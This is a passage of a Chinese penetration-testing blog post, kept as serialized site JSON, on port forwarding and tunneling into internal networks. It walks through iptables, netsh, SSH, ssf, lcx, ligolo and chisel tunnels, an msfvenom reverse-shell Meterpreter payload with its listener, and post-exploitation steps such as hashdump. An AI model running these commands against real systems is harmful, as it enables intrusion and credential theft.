pass:neo4j&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;windows安全标识符sid&quot;],&quot;text&quot;:[0,&quot;Windows安全标识符SID&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;临时http服务架设&quot;],&quot;text&quot;:[0,&quot;临时HTTP服务架设&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;cmd&quot;],&quot;text&quot;:[0,&quot;Cmd&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;wmi&quot;],&quot;text&quot;:[0,&quot;Wmi&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;wmi-1&quot;],&quot;text&quot;:[0,&quot;Wmi&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;powershell基础操作&quot;],&quot;text&quot;:[0,&quot;Powershell基础操作&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;powerview&quot;],&quot;text&quot;:[0,&quot;Powerview&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;linux&quot;],&quot;text&quot;:[0,&quot;Linux&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;addomain&quot;],&quot;text&quot;:[0,&quot;ADDomain&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;bloodhoundad&quot;],&quot;text&quot;:[0,&quot;BloodHoundAD&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;内网信息获取&quot;],&quot;date&quot;:[3,&quot;2026-01-23T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;内网信息&quot;],[0,&quot;信息收集&quot;],[0,&quot;命令&quot;]]],&quot;categories&quot;:[1,[[0,&quot;Penetration&quot;],[0,&quot;内网和域&quot;]]]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/29&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/内网和域/端口转发和映射&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;端口映射和转发&quot;],&quot;date&quot;:[3,&quot;2026-01-23T10:36:57.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;端口转发&quot;],[0,&quot;映射&quot;],[0,&quot;代理&quot;],[0,&quot;proxy&quot;]]],&quot;categories&quot;:[1,[[0,&quot;Penetration&quot;],[0,&quot;内网和域&quot;]]]}],&quot;body&quot;:[0,&quot;# iptables\n\n```\n需开启ip转发功能\n&gt;vim /etc/sysctl.conf设置net.ipv4.ip_forward=1\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/179.png) ![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/180.png)\n\n```\n本地端口22转发到2222上\n&gt;iptables -t nat -A PREROUTING -p tcp --dport 2222 -j REDIRECT --to-ports 22\n内网98机器3389转到本机110的6789上\n&gt;iptables -t nat -A PREROUTING -d 192.168.0.110 -p tcp --dport 6789 -j DNAT --to-destination 192.168.0.98:3389\n&gt;iptables -t nat -A POSTROUTING -d 192.168.0.98 -p tcp --dport 3389 -j SNAT --to 192.168.0.110\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/181.png)\n\n```\n查看规则\n&gt;iptables -t nat -L\n删除规则\n&gt;iptables -t nat -D PREROUTING 1\n删除全部规则\n&gt;iptables -t nat –F\n```\n# lcx\n\n```\n使用条件：服务器通外网，拥有自己的公网ip\n靶机：lcx.exe -slave 外网IP 9999 127.0.0.1 3389\nlinux攻击机：./portmap -m 2 -p1 9999 -p2 33889\nwindows攻击机：lcx -listen 9999 33889 把本机9999监听的信息转到33889\nPortTran\nhttps://github.com/k8gege/K8tools/raw/master/PortTran.rar\n攻击机执行\n&gt;PortTranS20.exe 12345 389\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/163.png)\n\n```\n靶机执行\n&gt;PortTranC20.exe 127.0.0.1 3389 192.168.0.102 12345\n建立连接后，攻击机连接本机389端口即可\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/164.png)\n# msf\n\n```\nMeterpreter 列出活动的端口转发\n&gt;portfwd list\n使用条件：服务器通外网，拥有自己的公网ip\n&gt;portfwd add -l 5555 -p 3389 -r 172.16.86.153\n转发目标主机的3389远程桌面服务端口到本地的5555\n删除转发\n&gt;portfwd delete –l 3389 –p 3389 –r target-host \n&gt;portfwd flush\n```\n# netsh\n\n```\n边界机器执行：\n&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=2222 connectaddress=10.1.1.108 connectport=22\n将内网10.1.1.108主机22端口转发至本机2222端口，攻击机连接边界机器2222端口即可访问内网SSH\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/176.png)\n\n```\n&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=13389 connectaddress=192.168.0.98 connectport=3389\n当靶机某服务只允许内网访问时，将端口转发出来\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/177.png)\n\n```\n添加防火墙规则：\n&gt;netsh advfirewall firewall add rule name=\&quot;RDP\&quot; protocol=TCP dir=in localip=192.168.0.98 localport=13389 action=allow\n列出所有转发规则:\n&gt;netsh interface portproxy show all\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/178.png)\n\n```\n删除指定的端口转发规则：\n&gt;netsh interface portproxy delete v4tov4 listenport=13389 listenaddress=192.168.0.98\n删除所有转发规则：\n&gt;netsh interface portproxy reset\n```\n# ssf\n\n**单层网络正向转发**\n\n```\nhttps://github.com/securesocketfunneling/ssf/releases\n内网机执行：\n&gt;ssfd.exe -p 1080\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/170.png)\n\n```\n边界机器执行\n&gt;ssf.exe -L 12138:10.1.1.108:22 -p 1080 192.168.0.98 \n把内网10.1.1.108的SSH转发出来\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/171.png)\n\n```\n边界机器访问内网端口\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/172.png)\n\n**单层网络反向转发**\n\n```\n边界机器执行：\n&gt;ssfd.exe -p 1080\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/173.png)\n\n```\n内网机器执行：\n&gt;ssf.exe -R 12138:10.1.1.108:22 -p 1080 192.168.0.106\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/174.png) ![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/175.png)\n# ssh\n\n**SSH基本参数**\n\n```\n-C 压缩传输，加快传输速度\n-f 在后台对用户名密码进行认证\n-N 仅仅只用来转发，不用再弹回一个新的shell -n 后台运行\n-q 安静模式，不要显示任何debug信息\n-l 指定ssh登录名\n-g 允许远程主机连接到本地用于转发的端口\n-L 进行本地端口转发\n-R 进行远程端口转发\n-D 动态转发，即socks代理\n-T 禁止分配伪终端\n-p 指定远程ssh服务端口\n```\n\n**正向转发**\n1. 方法一\n外网靶机110，内网靶机115\n本地攻击机编辑后restart ssh服务\n```\n#vim /etc/ssh/sshd_conf\nAllowTcpForwarding yes 允许TCP转发\nGatewayPorts yes   允许远程主机连接本地转发的端口\nTCPKeepAlive yes    TCP会话保持存活\nPasswordAuthentication yes  密码认证\n```\n本地攻击机执行，把115的3389映射到本地的33890上\n```\n&gt;ssh -C -f -N -g -L 33890:192.168.0.115:3389 root@192.168.0.110 -p 22\n```\n2. 方法2（上线MSF）\n** 攻击机--出网Linux靶机--不出网Linux靶机--不出网win机 **\n攻击逻辑说明：\n* Windows 执行 1.exe\n* → 连接 “不出网 Linux:12138”\n*   ↓ （SSH 转发）\n* 不出网 Linux 把 12138 映射到 “出网 Linux:12138”\n*   ↓ （SSH 转发）\n*  出网 Linux 把 12138 映射到 “攻击机:12345”\n    ↓\n* 攻击机 msfconsole 收到 meterpreter 会话\n```\nmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=不出网Linux机 lport=12138 -f exe -o /var/www/html/1.exe\n```\n攻击机监听端口12345\n```\nmsf6 &gt; use exploit/multi/handler\nmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) &gt; set lhost 0.0.0.0\nmsf6 exploit(multi/handler) &gt; set lport 12345\nmsf6 exploit(multi/handler) &gt; set ExitOnSession false\nmsf6 exploit(multi/handler) &gt; exploit -j\n[*] Exploit running as background job 0.\n[*] Started reverse TCP handler on 0.0.0.0:12345\n```\n不出网Linux机\n```\nssh -C -f -N -g -L 0.0.0.0:12138:攻击机:12345 root@出网Linux主机 -p 22\n```\n这样就建立连接了，然后可以这样做\n```\n# 把会话放到后台\nmeterpreter &gt; background\n# 查看/升级 transport（断网重连）\nmsf6 &gt; sessions -i 1\nmeterpreter &gt; transport list\nmeterpreter &gt; transport add -t reverse_tcp -l 攻击机公网IP -p 443\nmeterpreter &gt; transport next\n# 常用其它命令\nmeterpreter &gt; sysinfo # 系统版本 / 补丁\t\nmeterpreter &gt; getuid # 当前用户 / 特权\t\nmeterpreter &gt; run post/windows/gather/enum_domain #域信息\t\nmeterpreter &gt; run post/windows/gather/enum_av 杀软 / 防火墙\t\nmeterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.0-3.0/24 # 网络段\t\nmeterpreter &gt; hashdump（需 SYSTEM） # 密码哈希（需SYSTEM）\nmeterpreter &gt; run post/windows/gather/enum_logged_on_users # 最近登录\t\n```\n\n**反向转发**\n\n外网攻击107，内网靶机97\n\n出网靶机编辑后restart ssh服务\n```\n#vim /etc/ssh/sshd_conf\nAllowTcpForwarding yes 允许TCP转发\nGatewayPorts yes   允许远程主机连接本地转发的端口\nTCPKeepAlive yes    TCP会话保持存活\nPasswordAuthentication yes  密码认证\n```\n边界靶机上执行，把内网靶机97的3389映射到公网VPS107的33809上\nssh -C -f -N -g -R 33890:10.1.1.97:3389 root@192.168.0.107 -p 22\nnetstat –tnlp\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/165.png)\n\n```\n转发成功，外网攻击机安装apt install rinetd(正向tcp转发工具)\n&gt;vim /etc/rinetd.conf\n添加0.0.0.0 3389 127.0.0.1 33890\n&gt;service rinetd start\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/166.png)\n\n```\n看到107是kali攻击机，连接107:33890即可到达内网10.1.1.97的桌面\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/167.png)\n\n# Invoke-SocksProxy\n\n```\nhttps://gitee.com/RichChigga/Invoke-SocksProxy\n&gt;Import-Module .\\Invoke-SocksProxy.psm1 \n&gt;Invoke-SocksProxy -bindPort 12138 建立socks代理，使用代理软件连接\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/168.png) ![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/169.png)\n# Ligolo\n\n```\ncd `go env GOPATH`/src\n📢反引号 `...` 是 命令替换的意思，实际效果就是会返回go的环境变量路径拼接到后面使用。\n&gt;git clone https://github.com/sysdream/ligolo\n&gt;cd ligolo\n&gt;make dep\n生成证书,example.com换成攻击机的域名或IP地址\n&gt;make certs TLS_HOST=example.com\n\n&gt;make build-all\n\n靶机执行\n&gt;ligolo_windows_amd64.exe -relayserver 攻击机IP:5555\n攻击机执行\n&gt;./bin/localrelay_linux_amd64\n```\n以上场景适用于内网靶机可访问外网，但外网无法访问内网的情况，最后生成一个在攻击机上的11601 的socks5监听端口，实际生成效果和以下命令相似：\n```\nssh -CfNg -D 11601 root@靶机IP\n```\n区别是隧道搭建时是靶机连攻击机，ssh是攻击机连靶机\n# chisel\n\n工具下载链接：\nhttps://github.com/jpillora/chisel \n\n攻击机执行\n```\nchisel server -p 12138 –reverse\n```\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/182.png)\n靶机执行\n```\n&gt;chisel client 公网攻击机IP:12138 R:1234:127.0.0.1:3389\n```\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/183.png)\n建立成功后，攻击机连接本机1234端口即可访问靶机3389\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/184.png)&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/内网和域/端口转发和映射.md&quot;],&quot;digest&quot;:[0,&quot;1484ba373c9d8ff6&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;iptables\&quot;&gt;iptables&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#iptables\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;需开启ip转发功能&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;vim /etc/sysctl.conf设置net.ipv4.ip_forward=1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/179.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt; &lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/180.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;本地端口22转发到2222上&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat -A PREROUTING -p tcp --dport 2222 -j REDIRECT --to-ports 22&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;内网98机器3389转到本机110的6789上&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat -A PREROUTING -d 192.168.0.110 -p tcp --dport 6789 -j DNAT --to-destination 192.168.0.98:3389&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat -A POSTROUTING -d 192.168.0.98 -p tcp --dport 3389 -j SNAT --to 192.168.0.110&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/181.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;查看规则&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat -L&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;删除规则&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat -D PREROUTING 1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;删除全部规则&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;iptables -t nat –F&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;lcx\&quot;&gt;lcx&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#lcx\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;使用条件：服务器通外网，拥有自己的公网ip&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;靶机：lcx.exe -slave 外网IP 9999 127.0.0.1 3389&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;linux攻击机：./portmap -m 2 -p1 9999 -p2 33889&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;windows攻击机：lcx -listen 9999 33889 把本机9999监听的信息转到33889&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PortTran&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/k8gege/K8tools/raw/master/PortTran.rar&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;攻击机执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;PortTranS20.exe 12345 389&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/163.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;靶机执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;PortTranC20.exe 127.0.0.1 3389 192.168.0.102 12345&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;建立连接后，攻击机连接本机389端口即可&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/164.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;msf\&quot;&gt;msf&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#msf\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Meterpreter 列出活动的端口转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;portfwd list&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;使用条件：服务器通外网，拥有自己的公网ip&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;portfwd add -l 5555 -p 3389 -r 172.16.86.153&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;转发目标主机的3389远程桌面服务端口到本地的5555&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;删除转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;portfwd delete –l 3389 –p 3389 –r target-host &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;portfwd flush&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;netsh\&quot;&gt;netsh&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#netsh\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;边界机器执行：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=2222 connectaddress=10.1.1.108 connectport=22&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;将内网10.1.1.108主机22端口转发至本机2222端口，攻击机连接边界机器2222端口即可访问内网SSH&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/176.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=13389 connectaddress=192.168.0.98 connectport=3389&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;当靶机某服务只允许内网访问时，将端口转发出来&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/177.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;添加防火墙规则：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh advfirewall firewall add rule name=\&quot;RDP\&quot; protocol=TCP dir=in localip=192.168.0.98 localport=13389 action=allow&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;列出所有转发规则:&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh interface portproxy show all&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/178.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;删除指定的端口转发规则：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh interface portproxy delete v4tov4 listenport=13389 listenaddress=192.168.0.98&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;删除所有转发规则：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;netsh interface portproxy reset&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;ssf\&quot;&gt;ssf&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#ssf\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;strong&gt;单层网络正向转发&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/securesocketfunneling/ssf/releases&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;内网机执行：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ssfd.exe -p 1080&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/170.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;边界机器执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ssf.exe -L 12138:10.1.1.108:22 -p 1080 192.168.0.98 &lt;/span&gt;&lt;/span&gt;\n&lt;span 